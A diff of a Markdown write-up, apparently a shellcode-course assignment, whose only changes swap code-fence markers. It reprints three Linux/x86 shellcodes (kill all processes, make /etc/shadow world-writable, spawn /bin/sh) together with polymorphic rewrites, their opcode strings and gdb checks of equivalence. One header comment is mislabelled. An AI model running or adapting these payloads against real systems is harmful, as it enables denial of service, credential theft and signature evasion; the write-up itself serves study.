@@ -41,7 +41,7 @@ The author of the original shellcode is Kris Katterjohn. The code can be found <
 
 #### Original Shellcode
 
-```nasm
+~~~ nasm
 ;By Kris Katterjohn 11/13/2006
 
 ;11 byte shellcode to kill all processes for Linux/x86
@@ -59,11 +59,11 @@ _start:
   push byte 9
   pop ecx
   int 0x80
-```
+~~~
 
 #### Compiling the Original Shellcode
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes-original
 [+] Assembling with Nasm
 [+] Linking
@@ -71,14 +71,14 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-proces
 "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80"
 [+] Size: 11 bytes
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$
-```
+~~~
 
 #### Polymorphic Shellcode
 The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/kill-all-processes.nasm">here</a>
 
 Below is an explanation of the changes.
 
-```nasm
+~~~ nasm
 ;kill-all-processes.nasm
 ;this kills all processes on the local system
 ;Linux x86
@@ -102,11 +102,11 @@ _start:
   push byte -1
   pop ebx
   int 0x80
-```
+~~~
 
 #### Compiling the Polymorphic Shellcode
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes
 [+] Assembling with Nasm
 [+] Linking
@@ -114,11 +114,11 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-proces
 "\x6a\x09\xb0\x09\xb1\x04\xf6\xe1\xfe\xc0\x59\x6a\xff\x5b\xcd\x80"
 [+] Size: 16 bytes
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$
-```
+~~~
 
 #### Disassembly of the Original Shellcode
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./kill-all-processes-original
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/kill-all-processes-original...(no debugging symbols found)...done.
 (gdb) break _start
@@ -161,11 +161,11 @@ es             0x7b	123
 fs             0x0	0
 gs             0x0	0
 (gdb)
-```
+~~~
 
 #### Disassembly of the Polymorphic Shellcode
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./kill-all-processes
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/kill-all-processes...(no debugging symbols found)...done.
 (gdb) break _start
@@ -210,7 +210,7 @@ es             0x7b	123
 fs             0x0	0
 gs             0x0	0
 (gdb)
-```
+~~~
 
 After comparing the state of the general purpose registers in the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.
 
@@ -221,7 +221,7 @@ The author of the original shellcode is "root@thegibson". The code can be found 
 
 #### Original Shellcode
 
-```nasm
+~~~ nasm
 ; linux/x86 chmod 666 /etc/shadow 27 bytes
 ; root@thegibson
 ; 2010-01-15
@@ -240,11 +240,11 @@ _start:
   mov ebx, esp
   mov cx, 0666o
   int 0x80
-```
+~~~
 
 #### Compiling the Original Shellcode
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod-original
 [+] Assembling with Nasm
 [+] Linking
@@ -252,14 +252,14 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod-original
 "\xb0\x0f\x99\x52\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
 [+] Size: 27 bytes
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$
-```
+~~~
 
 #### Polymorphic Shellcode
 The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/chmod-shadow.nasm">here</a>
 
 Below is an explanation of the changes.
 
-```nasm
+~~~ nasm
 ;chmod-shadow.nasm
 ;this changes the permissions for /etc/shadow to 666
 ;Linux x86
@@ -287,11 +287,11 @@ _start:
   mov ebx, esp  ;stack pointer
   mov cx, 0666o ; permissions 666
   int 0x80
-```
+~~~
 
 #### Compiling the Polymorphic Shellcode
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod
 [+] Assembling with Nasm
 [+] Linking
@@ -299,11 +299,11 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod
 "\xb0\x08\x00\xc0\xfe\xc8\x99\x51\x66\x68\x6f\x77\x66\x68\x61\x64\x66\x68\x73\x68\x66\x68\x63\x2f\x66\x68\x65\x74\x66\x68\x2f\x2f\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
 [+] Size: 40 bytes
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$
-```
+~~~
 
 #### Disassembly of the Original Shellcode
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./chmod-original
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/chmod-original...(no debugging symbols found)...done.
 (gdb) break _start
@@ -351,11 +351,11 @@ gs             0x0	0
 0xbffff6f0:	0x2f	0x2f	0x65	0x74	0x63	0x2f	0x73	0x68
 0xbffff6f8:	0x61	0x64	0x6f	0x77	0x00	0x00	0x00	0x00
 (gdb)
-```
+~~~
 
 #### Disassembly of the Polymorphic Shellcode
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./chmod
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/chmod...(no debugging symbols found)...done.
 (gdb) break _start
@@ -408,7 +408,7 @@ gs             0x0	0
 0xbffff700:	0x2f	0x2f	0x65	0x74	0x63	0x2f	0x73	0x68
 0xbffff708:	0x61	0x64	0x6f	0x77	0x00	0x00	0x00	0x00
 (gdb)
-```
+~~~
 
 After comparing the state of the general purpose registers and values on the stack in both the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.
 
@@ -419,7 +419,7 @@ The author of the original shellcode is "kernel_panik". The code can be found <a
 
 #### Original Shellcode
 
-```nasm
+~~~ nasm
 ;Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
 ;Date     : 10 Feb 2011
 ;Author   : kernel_panik
@@ -438,11 +438,11 @@ _start:
  mov ebx, esp
  mov al, 11
  int 0x80
-```
+~~~
 
 #### Compiling the Original Shellcode
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack-original
 [+] Assembling with Nasm
 [+] Linking
@@ -450,14 +450,14 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-s
 "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
 [+] Size: 21 bytes
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$
-```
+~~~
 
 #### Polymorphic Shellcode
 The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/execve-stack-bin-sh.nasm">here</a>
 
 Below is an explanation of the changes.
 
-```nasm
+~~~ nasm
 ;execve-stack-bin-sh.nasm
 ;this changes the permissions for /etc/shadow to 666
 ;Linux x86
@@ -484,11 +484,11 @@ _start:
   xchg eax, ebx ;EAX now contains the correct syscall value, 11.  
                 ;EBX contians the stack pointer
   int 0x80
-```
+~~~
 
 #### Compiling the Polymorphic Shellcode
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack
 [+] Assembling with Nasm
 [+] Linking
@@ -496,11 +496,11 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-s
 "\x31\xdb\x53\x58\x50\xb3\x06\x00\xdb\xfe\xcb\x66\x68\x73\x68\x66\x68\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe0\x93\xcd\x80"
 [+] Size: 29 bytes
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$
-```
+~~~
 
 #### Disassembly of the Original Shellcode
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./execve-bin-sh-stack-original
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/execve-bin-sh-stack-original...(no debugging symbols found)...done.
 (gdb) break _start
@@ -547,11 +547,11 @@ gs             0x0	0
 0xbffff6d4:	0x2f	0x62	0x69	0x6e	0x2f	0x2f	0x73	0x68
 0xbffff6dc:	0x00	0x00	0x00	0x00
 (gdb)
-```
+~~~
 
 #### Disassembly of the Polymorphic Shellcode
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./execve-bin-sh-stack
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/execve-bin-sh-stack...(no debugging symbols found)...done.
 (gdb) break _start
@@ -603,7 +603,7 @@ gs             0x0	0
 0xbffff6e4:	0x2f	0x62	0x69	0x6e	0x2f	0x2f	0x73	0x68
 0xbffff6ec:	0x00	0x00	0x00	0x00
 (gdb)
-```
+~~~
 
 After comparing the state of the general purpose registers and values on the stack in both the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.
 
